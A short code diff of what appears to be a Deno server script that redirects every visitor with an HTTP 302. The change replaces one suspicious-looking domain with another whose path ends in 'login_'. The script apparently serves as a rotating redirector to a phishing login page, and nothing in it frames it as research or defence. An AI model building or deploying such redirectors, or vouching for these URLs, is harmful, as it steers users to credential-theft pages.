@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://acesxreviewsaccive.de/scw/",
+      Location: "https://aceixrevwsaccive.one/burkhe/login_/",
     },
   });
 });
